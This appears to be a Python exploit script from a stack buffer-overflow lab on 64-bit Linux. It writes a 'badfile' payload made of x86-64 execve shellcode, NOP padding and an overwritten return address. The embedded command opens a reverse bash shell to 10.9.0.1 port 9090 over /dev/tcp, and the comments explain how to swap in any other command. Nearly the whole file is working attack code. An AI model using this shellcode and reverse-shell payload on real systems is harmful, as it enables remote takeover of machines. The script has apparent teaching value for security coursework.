import sys

shellcode= (
    "\xeb\x36\x5b\x48\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x48"
    "\x89\x5b\x48\x48\x8d\x4b\x0a\x48\x89\x4b\x50\x48\x8d\x4b\x0d\x48"
    "\x89\x4b\x58\x48\x89\x43\x60\x48\x89\xdf\x48\x8d\x73\x48\x48\x31"
    "\xd2\x48\x31\xc0\xb0\x3b\x0f\x05\xe8\xc5\xff\xff\xff"
    "/bin/bash*"
    "-c*"
    # You can modify the following command string to run any command.
    # You can even run multiple commands. When you change the string,
    # make sure that the position of the * at the end doesn't change.
    # The code above will change the byte at this position to zero,
    # so the command string ends here.
    # You can delete/add spaces, if needed, to keep the position the same. 
    # The * in this line serves as the position marker         * 
    "/bin/bash -i > /dev/tcp/10.9.0.1/9090 0<&1 2>&1           *"
    "AAAAAAAA"   # Placeholder for argv[0] --> "/bin/bash"
    "BBBBBBBB"   # Placeholder for argv[1] --> "-c"
    "CCCCCCCC"   # Placeholder for argv[2] --> the command string
    "DDDDDDDD"   # Placeholder for argv[3] --> NULL
).encode('latin-1')

# Fill the content with NOP's
content = bytearray(0x90 for i in range(517)) 

##################################################################             
rbp = 0x00007fffffffe130
# Decide the return address value 
ret = 0x00007fffffffe060 # put the start of the buffer as return address because to overcome the problem of the zeros in the 64-bits address we put our malicious code before the return address 

if ((buf_size := rbp - ret) >= len(shellcode)):
  # Put the shellcode somewhere in the payload
  content[:len(shellcode)] = shellcode

  # Use 4 for 32-bit address and 8 for 64-bit address
  offset =  (rbp - 0x00007fffffffe060) + 8 # bytes between the start of the buffer the return address (excluded)
  # put the return address somewhere in the payload
  content[offset:offset + 8] = (ret).to_bytes(8,byteorder='little') 

  # Write the content to a file
  with open('badfile', 'wb') as f:
    f.write(content)
else:
  print("The attack is infeasible with this approch")
##################################################################